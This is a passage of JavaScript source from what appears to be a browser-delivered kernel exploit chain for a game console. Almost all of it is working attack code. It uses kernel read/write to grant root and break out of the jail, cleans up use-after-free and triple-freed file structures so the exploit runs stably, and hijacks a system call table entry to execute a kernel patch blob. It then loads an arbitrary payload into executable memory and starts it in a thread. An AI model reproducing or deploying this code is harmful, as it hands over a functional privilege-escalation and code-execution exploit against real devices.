                                kview(procFd).setBInt(FD_RDIR, rootVnode);
                                kview(procFd).setBInt(FD_JDIR, rootVnode);
                                const uidNow = sc(SYS.getuid).i32;
                                jailbroken = uidNow === 0;
                                mark("JAILBROKEN", "uid=" + uidNow
                                    + " prison0=" + kview(ucred).getBInt(CR_PRISON)
                                    + " fd_rdir=" + kview(procFd).getBInt(FD_RDIR));
                                check("kernel-reports-root",
                                    jailbroken, "getuid=" + uidNow);
                            }
                        }
                    } catch (e) {
                        jailbreakThrew = e && e.message ? e.message : "" + e;
                        mark("JAILBREAK-THREW", jailbreakThrew
                            + " -- continuing to cleanup");
                    }


                    // Addresses captured during the repair so the end-of-run
                    // dump can re-read them once the sockets are closed.
                    const dumpOpts = [];
                    function removeRthdrFromSocket(fd) {
                        const fp = fget(fd);
                        if (!kptr2(fp)) return "badfp";
                        const fData = kv.read8(fp);
                        if (!kptr2(fData)) return "badfdata";
                        const soPcb = kv.read8(fData.add32(0x18));
                        if (!kptr2(soPcb)) return "badpcb";
                        const opts = kv.read8(soPcb.add32(0x118));
                        if (kptr2(opts)) dumpOpts.push({ fd: fd, opts: opts });
                        if (!kptr2(opts)) return "noopts";
                        // ITEM 4. Read it, write it, READ IT BACK. This is the
                        // single write that decides whether the process can exit
                        // without panicking, and until now nothing anywhere in
                        // the chain has ever confirmed that a kv write actually
                        // lands -- the check below reported "nulled" purely
                        // because the four reads above looked pointer-shaped.
                        // poops.js:7123-7128 reads back the same way.
                        const was = kview(opts).getBInt(0x68);
                        kview(opts).setBInt(0x68, new int64(0, 0));
                        const now = kview(opts).getBInt(0x68);
                        if (!now || (now.low >>> 0) !== 0 || (now.hi >>> 0) !== 0) {
                            mark("RTHDR-NULL-FAILED", "fd=" + fd + " opts=" + opts
                                + " was=" + was + " still=" + now);
                            return "writefail";
                        }
                        return was && ((was.low >>> 0) || (was.hi >>> 0))
                            ? "nulled" : "already0";
                    }
                    {
                        const res = triplets.map(fd => fd + ":" + removeRthdrFromSocket(fd));
                        mark("TRIPLET-RTHDR", res.join(" "));
                        // "already0" is a success: the field was already clear,
                        // so there is nothing to repair. Only a failed WRITE or
                        // a bad walk is a failure -- and unlike before, this now
                        // reflects a verified read-back rather than the shape of
                        // the pointers we walked to get here.
                        check("triplet-ip6po_rthdr-nulled",
                            res.every(r => r.endsWith("nulled")
                                        || r.endsWith("already0")),
                            res.join(" "));
                    }

                    // ITEM 6(c). The half that makes the retry safe. Every socket
                    // burned during a failed attempt still has an rthdr pointing
                    // at a freed ucred; closing it would free that chunk again.
                    // Now that kernel R/W exists, null the pointer -- verified by
                    // read-back -- and only then let it out of the burn list.
                    // Anything that will not repair STAYS burned and stays open.
                    if (burned.size) {
                        const bres = [], cleared = [];
                        for (const fd of burned) {
                            const r = removeRthdrFromSocket(fd);
                            bres.push(fd + ":" + r);
                            if (r === "nulled" || r === "already0") cleared.push(fd);
                        }
                        for (const fd of cleared) burned.delete(fd);
                        mark("BURNED-REPAIRED", bres.join(" ")
                            + "  still_burned=" + burned.size);
                        check("burned-sockets-repaired", burned.size === 0,
                            burned.size ? [...burned].join(",") : "");
                        if (burned.size) rebootRequired = true;
                    }

                    state("remove_uaf_file...", "warn");
                    const uafFp = fget(uafSock);
                    uafFpSaved = uafFp;
                    mark("UAF-FP", "fd=" + uafSock + " fp=" + uafFp);
                    if (kptr2(uafFp)) {

                        const r = fhold(uafFp);

                        // THIS LOOP WAS KILLING 22% OF THE RUNS THAT REACHED IT.
                        // 2048 x fget(), and every fget minted TWO int64 -- and
                        // int64.js gives each instance its own seven closures
                        // (int64.js:19-93), so 8 GC cells apiece -- plus a
                        // per-call Uint8Array inside kv.read8, plus two pipe
                        // syscalls. 34,816 objects and 4,096 syscalls in one
                        // unbroken synchronous stretch, at the point the heap is
                        // most loaded, with no yield anywhere in it. JSC's
                        // sweeper only runs when the event loop turns, so all of
                        // that garbage sat unswept until the await immediately
                        // after SOCKETS-CLOSED -- which is exactly where the
                        // process was being killed.
                        //
                        // Same range, same comparisons, same writes. The ofiles
                        // array is just read in bulk and scanned as raw words in
                        // the DataView: no int64, no typed array, no per-fd
                        // syscall. Two syscalls per 512 fds instead of 1024.
                        // Cleanup runs ~500 ms after the race, so the yields are
                        // free here.
                        // BOUNDED. This scan used to run to 0x800 with nothing
                        // proving the ofiles array is that big. If the table is
                        // smaller, the bulk read walks past the allocation and
                        // any 8 bytes out there that happen to equal uafFp get
                        // ZEROED by the fput below -- an out-of-bounds kernel
                        // write whose damage surfaces at the NEXT allocation,
                        // which is exactly the window where 22% of the runs
                        // reaching here died. POOPS.LUA:1219 scans only 0..255;
                        // we were eight times wider with no bound at all.
                        //
                        // Bound it by the highest fd we can PROVE is open,
                        // because we are holding it -- the table must have at
                        // least that many entries, and FreeBSD never shrinks it
                        // on close. No fd_nfiles offset to get wrong. The
                        // highest alias ever observed across 71 logged runs is
                        // 273, and our own sockets run past that.
                        let maxHeld = 0;
                        for (const fd of ipv6) if (fd > maxHeld) maxHeld = fd;
                        for (const fd of [masterPipe[0], masterPipe[1],
                                          slavePipe[0], slavePipe[1],
                                          iovSs[0], iovSs[1], uioSs[0], uioSs[1],
                                          uafSock])
                            if (fd > maxHeld) maxHeld = fd;
                        const SCAN_MAX = Math.min(0x800, maxHeld + 1);
                        mark("UAF-SCAN-BOUND", "max_held_fd=" + maxHeld
                            + " scan_max=" + SCAN_MAX + " was=2048");
                        // CLAMPED, and it has to be. This value is the loop
                        // INCREMENT at the bottom of this block, not a bound, so
                        // unlike every other knob in this file a bad value does
                        // not degrade to "do nothing" -- it never terminates.
                        // parseInt("0x200", 10) is 0 (it stops at the x), and
                        // 0x200 is exactly how the default is spelled right
                        // here, so that is the value someone is most likely to
                        // paste in. A non-terminating loop here awaits a 0 ms
                        // timer forever: the finally never runs, the main thread
                        // stays realtime-pinned, the freed file stays aliased,
                        // and the console needs a hard power-off.
                        // Upper bound: CHUNK_BYTES must stay strictly under
                        // PIPE_PAGE, or pipe_read wraps its buffer and hands
                        // back DUPLICATED data that still passes the
                        // rv === CHUNK_BYTES check -- which would make fput()
                        // write zeros far past the end of the fd table.
                        const CHUNK_FDS = (function () {
                            const cap = (PIPE_PAGE / FILEDESCENT_SIZE) >> 1;
                            const n = params.has("scanchunk")
                                ? parseInt(params.get("scanchunk"), 10) : 0x200;
                            if ((n | 0) === n && n >= 1 && n <= cap) return n;
                            if (params.has("scanchunk"))
                                mark("SCANCHUNK-CLAMPED", "given="
                                    + params.get("scanchunk") + " cap=" + cap
                                    + " using=0x200");
                            return 0x200;
                        })();
                        const CHUNK_BYTES = CHUNK_FDS * FILEDESCENT_SIZE;
                        const scanAb = new ArrayBuffer(CHUNK_BYTES);
                        keepAlive.push(scanAb);   // its address goes to the kernel
                        const scanAddr = bufAddr(scanAb);
                        const scanDv = new DataView(scanAb);
                        const wantLo = uafFp.low >>> 0, wantHi = uafFp.hi >>> 0;
                        let nulled = 0, bulkChunks = 0, slowChunks = 0;
                        const fds = [];
                        for (let base = 0; base < SCAN_MAX; base += CHUNK_FDS) {
                            // Clamp the LAST chunk. SCAN_MAX is now a measured
                            // bound, not a round number, so a fixed-size read
                            // here would walk past the table on the final chunk
                            // -- reintroducing the exact out-of-bounds this
                            // bound exists to prevent.
                            const nFds = Math.min(CHUNK_FDS, SCAN_MAX - base);
                            const nBytes = nFds * FILEDESCENT_SIZE;
                            const rv = kv.kread(scanAddr,
                                fdtOfiles.add32(base * FILEDESCENT_SIZE),
                                nBytes);
                            if (rv === nBytes) {
                                bulkChunks++;
                                for (let i = 0; i < nFds; ++i) {
                                    const o = i * FILEDESCENT_SIZE;
                                    if (scanDv.getUint32(o, true) === wantLo
                                        && scanDv.getUint32(o + 4, true) === wantHi) {
                                        const fd = base + i;
                                        fput(fd, new int64(0, 0));
                                        nulled++; fds.push(fd);
                                    }
                                }
                            } else {
                                // Short read: redo THIS CHUNK the original way.
                                // Never skip one -- a missed alias leaves the
                                // console dirty and costs a reboot, which is far
                                // worse than the allocation we are avoiding.
                                slowChunks++;
                                for (let i = 0; i < nFds; ++i) {
                                    const fd = base + i;
                                    if (same(fget(fd), uafFp)) {
                                        fput(fd, new int64(0, 0));
                                        nulled++; fds.push(fd);
                                    }
                                }
                            }
                            // Let the sweeper run. This is the whole point.
                            await new Promise(done => setTimeout(done, 0));
                        }
                        mark("UAF-SCAN", "chunks=" + CHUNK_FDS + "fd bulk="
                            + bulkChunks + " fellback=" + slowChunks
                            + " syscalls=" + (bulkChunks * 2 + slowChunks * CHUNK_FDS * 2));
                        uafSock = 0;

                        // ================== P1: DRAIN THE FILE ZONE ==================
                        // MEASURED, not assumed. A 256-allocation probe returned
                        // the SAME struct file at three consecutive fds
                        // (364,365,366): the chunk is linked into the Files zone
                        // free list THREE times -- freed 3x (CLEAR_QUEUE and two
                        // dup+close) but allocated once -- so falloc hands the
                        // identical object to three independent owners. The first
                        // to close it frees it; the other two dangle. That is the
                        // panic minutes after an idle run.
                        //
                        // The fd-table scan above cannot see this: a free-list
                        // entry is in no fd table. Pull the duplicates out by
                        // allocating until they surface (~1032 deep, stride 0x68).
                        //
                        // NULL the slot; do NOT leak the fd. f_count reads 1, not
                        // 3 -- each falloc resets it -- so three descriptors point
                        // at an object whose refcount says one, and leaking them
                        // only moves the panic to fdescfree at process exit.
                        // Nulling means nothing references it and it is orphaned
                        // for good. netctrl_c0w_twins.ts:1332 nulls before close
                        // for exactly this reason.
                        const DRAIN_CAP = (function () {
                            const n = params.has("drain")
                                ? parseInt(params.get("drain"), 10) : 1536;
                            return ((n | 0) === n && n >= 0 && n <= 8192) ? n : 1536;
                        })();
                        const DRAIN_EXPECT = 3, DRAIN_BATCH = 128;
                        // Visible to the `clean` decision below. Default true so
                        // that ?drain=0 does not by itself condemn the run.
                        let zoneClean = true;
                        if (DRAIN_CAP > 0) {
                            const dAb = new ArrayBuffer(DRAIN_BATCH * FILEDESCENT_SIZE);
                            keepAlive.push(dAb);
                            const dAddr = bufAddr(dAb), dDv = new DataView(dAb);
                            const oneAb = new ArrayBuffer(8); keepAlive.push(oneAb);
                            const oneAddr = bufAddr(oneAb), oneDv = new DataView(oneAb);
                            const wLo = uafFp.low >>> 0, wHi = uafFp.hi >>> 0;
                            const held = [], hitFds = [];
                            let scanned = 0, batches = 0, moved = 0, emfile = false;
                            // The fd table REALLOCATES as it grows, so the cached
                            // fdtOfiles goes stale mid-drain and both fget and fput
                            // would then touch freed memory. Re-read it each batch
                            // and use the fresh pointer for reads AND writes.
                            let ofl = fdtOfiles;
                            const dl = Date.now() + 15000;
                            while (scanned < DRAIN_CAP && hitFds.length < DRAIN_EXPECT
                                   && Date.now() < dl) {
                                const batch = [];
                                for (let i = 0; i < DRAIN_BATCH && scanned < DRAIN_CAP; ++i) {
                                    const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                                    if (fd === -1) { emfile = true; break; }
                                    batch.push(fd); held.push(fd); scanned++;
                                }
                                if (!batch.length) break;
                                batches++;
                                const fresh = kv.read8(kqFdp);
                                if (kptr2(fresh) && !(fresh.low === ofl.low
                                                   && fresh.hi === ofl.hi)) {
                                    ofl = fresh; moved++;
                                }
                                const lo = batch[0], hi = batch[batch.length - 1];
                                const span = (hi - lo + 1) * FILEDESCENT_SIZE;
                                let bulk = false;
                                if (span > 0 && span <= dAb.byteLength) {
                                    bulk = kv.kread(dAddr,
                                        ofl.add32(lo * FILEDESCENT_SIZE), span) === span;
                                }
                                for (const fd of batch) {
                                    let flo, fhi;
                                    if (bulk) {
                                        const o = (fd - lo) * FILEDESCENT_SIZE;
                                        flo = dDv.getUint32(o, true) >>> 0;
                                        fhi = dDv.getUint32(o + 4, true) >>> 0;
                                    } else {
                                        if (kv.kread(oneAddr,
                                            ofl.add32(fd * FILEDESCENT_SIZE), 8) !== 8)
                                            continue;
                                        flo = oneDv.getUint32(0, true) >>> 0;
                                        fhi = oneDv.getUint32(4, true) >>> 0;
                                    }
                                    if (flo === wLo && fhi === wHi) hitFds.push(fd);
                                }
                                await new Promise(done => setTimeout(done, 0));
                            }
                            // NULL every hit through the CURRENT ofiles, then close.
                            // close() on a nulled slot is a no-op, so nothing frees.
                            let nulledHits = 0;
                            for (const fd of hitFds) {
                                oneDv.setUint32(0, 0, true); oneDv.setUint32(4, 0, true);
                                kv.kwrite(ofl.add32(fd * FILEDESCENT_SIZE), oneAddr, 8);
                                if (kv.kread(oneAddr,
                                        ofl.add32(fd * FILEDESCENT_SIZE), 8) === 8
                                    && oneDv.getUint32(0, true) === 0
                                    && oneDv.getUint32(4, true) === 0) nulledHits++;
                                sc(SYS.close, fd);
                            }
                            for (const fd of held)
                                if (hitFds.indexOf(fd) < 0) sc(SYS.close, fd);
                            mark("ZONE-DRAIN", "scanned=" + scanned + "/" + DRAIN_CAP
                                + " batches=" + batches
                                + " hits=" + hitFds.length + "/" + DRAIN_EXPECT
                                + (hitFds.length ? " at_fds=" + hitFds.join(",") : "")
                                + " nulled=" + nulledHits
                                + " ofiles_moved=" + moved
                                + (emfile ? " EMFILE" : ""));
                            check("file-zone-duplicates-drained",
                                hitFds.length === DRAIN_EXPECT
                                && nulledHits === hitFds.length,
                                "found " + hitFds.length + " of " + DRAIN_EXPECT
                                + ", nulled " + nulledHits);
                            if (hitFds.length !== DRAIN_EXPECT
                                || nulledHits !== hitFds.length) {
                                rebootRequired = true; zoneClean = false;
                            }

                            // Independent verification: fresh allocations must no
                            // longer be handed the chunk. This is the measurement
                            // that says the console is actually clean.
                            const vfds = [];
                            let vhits = 0;
                            for (let i = 0; i < 16; ++i) {
                                const fd = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                                if (fd === -1) break;
                                vfds.push(fd);
                            }
                            const vres = kv.read8(kqFdp);
                            const vofl = kptr2(vres) ? vres : ofl;
                            for (const fd of vfds) {
                                if (kv.kread(oneAddr,
                                        vofl.add32(fd * FILEDESCENT_SIZE), 8) !== 8) {
                                    sc(SYS.close, fd); continue;
                                }
                                if ((oneDv.getUint32(0, true) >>> 0) === wLo
                                    && (oneDv.getUint32(4, true) >>> 0) === wHi) {
                                    vhits++;
                                    oneDv.setUint32(0, 0, true);
                                    oneDv.setUint32(4, 0, true);
                                    kv.kwrite(vofl.add32(fd * FILEDESCENT_SIZE),
                                        oneAddr, 8);
                                }
                                sc(SYS.close, fd);
                            }
                            mark("ZONE-VERIFY", "alloc=" + vfds.length
                                + " residual_hits=" + vhits);
                            check("freed-file-not-reissued-by-falloc", vhits === 0,
                                vhits ? "still reissued after the drain" : "");
                            if (vhits) { rebootRequired = true; zoneClean = false; }
                        }
                        // ================ END P1: DRAIN THE FILE ZONE ================


                        mark("UAF-REMOVED", "fhold=" + r.before + "->" + r.after
                            + " nulled=" + nulled + "/" + SCAN_MAX
                            + " fds=" + fds.join(","));
                        // `nulled > 0` only ever proved the LIVE FD TABLE was
                        // tidy. It is structurally blind to a free-list entry,
                        // and every "clean" run we celebrated was reporting on
                        // that blind evidence -- which is why the console kept
                        // panicking minutes later. A run is clean only if the fd
                        // table was repaired AND the zone drain removed every
                        // duplicate AND fresh allocations no longer see it.
                        check("alias-freed-file-nulled",
                            nulled > 0, "nulled=" + nulled);
                        const clean = nulled > 0 && zoneClean;
                        if (clean) rebootRequired = false;
                        else mark("STILL-DIRTY", "reboot=1 fdtable="
                            + (nulled > 0 ? "ok" : "FAILED")
                            + " zone=" + (zoneClean ? "ok" : "FAILED"));
                    } else {
                        check("uaf_sock-struct-file-readable", false,
                            "fp=" + uafFp);
                    }

                    {
                        let closed = 0, heldBack = 0;
                        for (const fd of ipv6) {
                            // ITEM 6(c). A still-burned socket owns an rthdr over
                            // freed memory; close() would free it a second time.
                            // Leaking the fd costs nothing, freeing it panics.
                            if (burned.has(fd)) { heldBack++; continue; }
                            if (sc(SYS.close, fd).i32 === 0) closed++;
                        }
                        for (const fd of [iovSs[0], iovSs[1], uioSs[0], uioSs[1]])
                            if (sc(SYS.close, fd).i32 === 0) closed++;
                        mark("SOCKETS-CLOSED", "n=" + closed + "/" + (ipv6.length + 4)
                            + (heldBack ? "  held_back_burned=" + heldBack : ""));
                    }

                    await restoreThreadAttrs("cleanup");


                    let kpatched = false;
                    if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
                        state("kernel patches...", "warn");
                        const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                        const sysent = kernelBase.add32(off.k_sysent_661);
                        const gadget = kernelBase.add32(off.k_jmp_rsi);
                        const gb = [];
                        for (let i = 0; i < 4; ++i) {
                            new Uint8Array(kvwAb).fill(0);
                            kv.kread(kvwAddr, gadget.add32(i), 1);
                            gb.push(kvwDv.getUint8(0));
                        }
                        mark("JMP-RSI-BYTES", gadget + " -> "
                            + gb.map(v => v.toString(16).padStart(2, "0")).join(" "));

                        const gadgetOk = gb[0] === 0xff && gb[1] === 0x26;
                        const oNarg = kview(sysent).getInt32(SYSENT_NARG);
                        const oCall = kview(sysent).getBInt(SYSENT_CALL);
                        const oThr = kview(sysent).getInt32(SYSENT_THRCNT);
                        mark("SYSENT-661", "narg=" + oNarg + " thrcnt=" + oThr
                            + " sy_call=" + oCall);
                        const sysentOk = oNarg >= 0 && oNarg <= 8 && kptr2(oCall);

                        const siteBytes = [];
                        let sitesOk = true;
                        for (const s of KPATCH_JMP_SITES) {
                            new Uint8Array(kvwAb).fill(0);
                            kv.kread(kvwAddr, kernelBase.add32(s), 1);
                            const b = kvwDv.getUint8(0);
                            siteBytes.push(hx(s) + ":" + b.toString(16));
                            if (!((b >= 0x70 && b <= 0x7f) || b === 0xeb)) sitesOk = false;
                        }
                        mark("KPATCH-SITES", siteBytes.join(" "));
                        check("gadget-sysent661-patch-sites-look-right",
                            gadgetOk && sysentOk && sitesOk,
                            "gadget=" + gadgetOk + " sysent=" + sysentOk
                            + " sites=" + sitesOk);
                        if (gadgetOk && sysentOk && sitesOk) {
                            const jitFd = sc(SYS.jitshm_create, 0, 0x4000, 7).i32;
                            const KEXEC_MAP = new int64(0x20100000, 9);
                            const mapped = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7,
                                0x11, jitFd, 0);
                            const mapAddr = new int64(mapped.lo, mapped.hi);
                            mark("KPATCH-MAP", "jitshm_create=" + jitFd
                                + " mmap=" + mapAddr);
                            if (mapAddr.hi > 0) {
                                for (let i = 0; i < kpatch.length; ++i)
                                    p.write1(mapAddr.add32(i), kpatch[i]);
                                let copied = true;
                                for (let i = 0; i < kpatch.length; ++i)
                                    if (p.read1(mapAddr.add32(i)) !== kpatch[i]) { copied = false; break; }
                                check("blob-rwx-memory-byte-byte",
                                    copied, kpatch.length + " bytes");
                                if (copied) {
                                    kview(sysent).setInt32(SYSENT_NARG, 2);
                                    kview(sysent).setBInt(SYSENT_CALL, gadget);
                                    kview(sysent).setInt32(SYSENT_THRCNT, 1);
                                    const armedOk = same(kview(sysent).getBInt(SYSENT_CALL), gadget);
                                    mark("SYSENT-ARMED", "sy_call=" + gadget
                                        + (armedOk ? "" : " MISMATCH"));
                                    if (armedOk) {
                                        // ITEM 5b. sysent[661] is now pointing at
                                        // a jmp [rsi] gadget SYSTEM-WIDE. If
                                        // anything between here and the restore
                                        // throws, every process on the console is
                                        // left with a weaponised syscall 661 --
                                        // and the outer finally does not cover
                                        // this, because it is nested inside the
                                        // KernelView block. Restore in a finally.
                                        let rc = -1;
                                        try {
                                            rc = sc(SYS.kexec, mapAddr).i32;
                                        } finally {
                                            kview(sysent).setInt32(SYSENT_NARG, oNarg);
                                            kview(sysent).setBInt(SYSENT_CALL, oCall);
                                            kview(sysent).setInt32(SYSENT_THRCNT, oThr);
                                            const back = same(
                                                kview(sysent).getBInt(SYSENT_CALL), oCall);
                                            if (!back) mark("SYSENT-NOT-RESTORED",
                                                "sy_call still " +
                                                kview(sysent).getBInt(SYSENT_CALL)
                                                + " -- syscall 661 is armed system-wide");
                                        }
                                        const verify = [];
                                        let allEb = true;
                                        for (const s of KPATCH_JMP_SITES) {
                                            new Uint8Array(kvwAb).fill(0);
                                            kv.kread(kvwAddr, kernelBase.add32(s), 1);
                                            const b = kvwDv.getUint8(0);
                                            verify.push(hx(s) + ":" + b.toString(16));
                                            if (b !== 0xeb) allEb = false;
                                        }
                                        mark("KEXEC", "arg=" + mapAddr + " rc=" + rc
                                            + " sysent=restored");
                                        mark("KPATCH-VERIFY", verify.join(" "));
                                        kpatched = rc === 0 && allEb;
                                        check("gated-site-reads-0xeb",
                                            allEb, "");
                                        check("blob-ran-ring-0", rc === 0,
                                            "kexec=" + rc);
                                        if (kpatched) mark("KERNEL-PATCHED",
                                            "sites=" + KPATCH_JMP_SITES.length);
                                    }
                                }
                            }
                        }
                    } else if (jailbroken) {
                        mark("KPATCH-SKIPPED", "blob=" + (kpatch ? kpatch.length : 0)
                            + " sites=" + KPATCH_JMP_SITES.length);
                    }

                    let payloadRunning = false;
                    if (payload && (kpatched || params.get("payload") === "1")
                        && params.get("payload") !== "0") {
                        state("payload...", "warn");
                        const sz = (payload.length + 0x3fff) & ~0x3fff;
                        const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                        const entry = new int64(m.lo, m.hi);
                        mark("PAYLOAD-MAP", "size=0x" + sz.toString(16)
                            + " rwx=" + entry);
                        if (entry.hi > 0) {
                            for (let i = 0; i < payload.length; ++i)
                                p.write1(entry.add32(i), payload[i]);
                            let bad = -1;
                            for (let i = 0; i < payload.length; ++i)
                                if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
                            check("byte-payload-rwx-memory",
                                bad < 0, bad < 0 ? "" : "mismatch at +" + hx(bad));
                            if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
                                const slot = webkitBase.add32(off.wk___imp_pthread_create);
                                const fn = p.read8(slot);
                                const expect = libkernelBase.add32(off.k_pthread_create);
                                const agree = same(fn, expect);
                                mark("PTHREAD-TABLE", "got=" + fn + " table="
                                    + expect + " agree=" + (agree ? 1 : 0));
                                if (agree) {
                                    const thr = new ArrayBuffer(8);
                                    keepAlive.push(thr);
                                    const thrAddr = bufAddr(thr);
                                    new Uint8Array(thr).fill(0);
                                    const rc = callAddr(expect,
                                        [thrAddr, 0, entry, 0]).i32;
                                    const handle = new int64(
                                        new DataView(thr).getUint32(0, true),
                                        new DataView(thr).getUint32(4, true));
                                    payloadRunning = rc === 0 && handle.hi > 0;
                                    mark("PTHREAD-CREATE", "rc=" + rc
                                        + " handle=" + handle);
                                    check("payload-thread-created",
                                        payloadRunning, "");
                                    if (payloadRunning) mark("PAYLOAD-RUNNING",
                                        "bytes=" + payload.length + " entry=" + entry);
                                }
                            }
                        }
                    }

                    // ================== END-OF-RUN STATE DUMP ==================
                    // READ ONLY. Not a fix -- a measurement. Everything above has
                    // finished, so this reports what we ACTUALLY leave behind
                    // rather than what the source implies we leave behind. Three
                    // confident inferences from reading code have already been
                    // wrong; this replaces the fourth with data.
                    // ?dump=0 to skip.
                    if (params.get("dump") !== "0") {
                        try {
                            const kq = v => v && (v.hi >>> 0) >= 0xffff0000;
                            const rd8 = a => kq(a) ? kv.read8(a) : null;
                            const rd32 = function (a) {
                                if (!kq(a)) return null;
                                dmpU8.fill(0);
                                if (kv.kread(dmpAddr, a, 4) !== 4) return null;
                                return dmpDv.getInt32(0, true);
                            };

                            // --- the 4 karw pipe files, and the forged pipebuf ---
                            // fd 15 reads f_count 2 BEFORE we touch it on every
                            // run while its siblings read 1. Nobody has explained
                            // that. This prints the final state of all four.
                            const pf = [];
                            for (const fd of [masterPipe[0], masterPipe[1],
                                              slavePipe[0], slavePipe[1]]) {
                                const fp = fget(fd);
                                pf.push(fd + ":" + (kq(fp) ? "fc=" + rd32(fp.add32(0x28))
                                                           : "nofp"));
                            }
                            mark("DUMP-PIPE-FCOUNT", pf.join(" "));

                            for (const [nm, fd] of [["master", masterPipe[0]],
                                                    ["slave", slavePipe[0]]]) {
                                const fp = fget(fd);
                                const fdata = rd8(fp);
                                if (!kq(fdata)) { mark("DUMP-PIPEBUF", nm + " nofdata"); continue; }
                                dmpU8.fill(0);
                                const okr = kv.kread(dmpAddr, fdata, 0x18) === 0x18;
                                mark("DUMP-PIPEBUF", nm + " @" + fdata
                                    + (okr ? "  cnt=" + dmpDv.getUint32(0, true)
                                        + " in=" + dmpDv.getUint32(4, true)
                                        + " out=" + dmpDv.getUint32(8, true)
                                        + " size=0x" + dmpDv.getUint32(0xc, true).toString(16)
                                        + " buffer=" + new int64(dmpDv.getUint32(0x10, true),
                                                                 dmpDv.getUint32(0x14, true))
                                        : "  READ-FAILED"));
                            }

                            // --- the triplets' outputopts, re-read after close ---
                            // Confirms the repair actually persisted rather than
                            // being undone by the socket teardown.
                            const to = [];
                            for (const e of dumpOpts) {
                                const r = rd8(e.opts.add32(0x68));
                                const pi = rd8(e.opts.add32(0x10));
                                to.push("fd" + e.fd + "@" + e.opts
                                    + " rthdr=" + (r || "?")
                                    + " pktinfo=" + (pi || "?"));
                            }
                            mark("DUMP-TRIPLET-OPTS", to.length ? to.join("  ") : "none");

                            // --- the triple-freed struct file ---
                            const uf = (typeof uafFpSaved !== "undefined") ? uafFpSaved : null;
                            if (kq(uf)) {
                                mark("DUMP-UAF-FILE", "fp=" + uf
                                    + " f_count=" + rd32(uf.add32(0x28))
                                    + " f_data=" + (rd8(uf) || "?"));
                            }

                            // --- ANY fd-table slot still pointing at it ---
                            if (kq(uf) && kq(fdtOfiles)) {
                                let hits = 0, lastFd = -1;
                                const wl = uf.low >>> 0, wh = uf.hi >>> 0;
                                const nfd = Math.min(0x400, (typeof SCAN_MAX !== "undefined")
                                    ? SCAN_MAX + 0x40 : 0x400);
                                for (let base = 0; base < nfd; base += 0x80) {
                                    const n = Math.min(0x80, nfd - base);
                                    if (kv.kread(scanAddrDump,
                                        fdtOfiles.add32(base * FILEDESCENT_SIZE),
                                        n * FILEDESCENT_SIZE) !== n * FILEDESCENT_SIZE) break;
                                    for (let i = 0; i < n; ++i) {
                                        const o = i * FILEDESCENT_SIZE;
                                        if (scanDvDump.getUint32(o, true) === wl
                                            && scanDvDump.getUint32(o + 4, true) === wh) {
                                            hits++; lastFd = base + i;
                                        }
                                    }
                                }
                                mark("DUMP-UAF-REFS", "slots_still_pointing_at_it=" + hits
                                    + (hits ? " last_fd=" + lastFd : "")
                                    + "  scanned=" + nfd);
                            }

                            // --- our own process ---
                            if (kq(curproc)) {
                                const uc = rd8(curproc.add32(0x40));
                                const pfd = rd8(curproc.add32(0x48));
                                mark("DUMP-PROC", "curproc=" + curproc
                                    + " ucred=" + (uc || "?")
                                    + (kq(uc) ? " cr_ref=" + rd32(uc.add32(0x00))
                                        + " uid=" + rd32(uc.add32(0x04))
                                        + " prison=" + (rd8(uc.add32(0x30)) || "?") : "")
                                    + " p_fd=" + (pfd || "?"));
                                if (kq(pfd))
                                    mark("DUMP-FILEDESC", "fd_cdir=" + (rd8(pfd.add32(0x10)) || "?")
                                        + " fd_rdir=" + (rd8(pfd.add32(0x18)) || "?")
                                        + " fd_jdir=" + (rd8(pfd.add32(0x20)) || "?"));
                            }

                            mark("DUMP-DONE", "read-only, no kernel writes");
                        } catch (e) {
                            mark("DUMP-THREW", (e && e.message) ? e.message : String(e));
                        }
                    }
                    // ================ END END-OF-RUN STATE DUMP ================

                    // ---- [STEP10-CHAIN] local syscall shim (scope fix: sc@501 is NOT in
// this nested block; callAddr + stubAddr ARE -- proven by the live log --
// so rebuild sc here from the visible pair instead of relying on the outer const):
const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken
                        + " kpatched=" + kpatched + " payload=" + payloadRunning
                        + " cleanup=" + (rebootRequired ? "incomplete" : "complete"));
                    allDone = payloadRunning && !rebootRequired;
                }
            }
        }

        mark("STEP10-SUMMARY", "committed=" + committed
            + " reboot=" + rebootRequired
            + " triplets=" + (triplets ? triplets.join(",") : "none")
            + " kernel_base=" + (kernelBase || "none")
            + " kq_fdp=" + (kqFdp || "none")
            + " kv=" + (kv ? "up" : "down"));

        if (!kv) {
            const stage = !committed ? "not-armed"
                : !triplets ? "triple-free"
                : !kernelBase ? "leak-kqueue"
                : "make-karw";
            mark("FAILED-STAGE", "stage=" + stage
                + " reached=" + (triplets ? "triplets" : committed ? "commit" : "none"));
        }

        state(allDone ? "ALL DONE"
              : kv ? "KERNEL R/W -- REBOOT NEEDED"
              : kernelBase ? "FAILED IN make_karw -- REBOOT"
              : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
              : committed ? "FAILED IN triple free -- REBOOT"
              : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
    } catch (e) {
        mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
        state("FAILED -- see log", "bad");
    } finally {

        if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);

        try {
            if (restoreCtx) await restoreCtx.restore("finally");
        } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
        for (const w of workers) {
            try { if (w.armed) { await w.rpc("disarm", 5000); w.armed = false; } }
            catch (e) { mark("DISARM-THREW", w.name + " " + e.message); }
        }
        for (const w of workers) {
            try {
                if (w.wired && w.master && w.origVector && p) {
                    p.write8(w.master.add32(0x10), w.origVector);
                    w.wired = false;
                }
            } catch (e) { }
        }
        for (const w of workers) { try { w.worker.terminate(); } catch (e) { } }
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) { mark("DISARM-THREW", e.message); }

        if (rebootRequired)
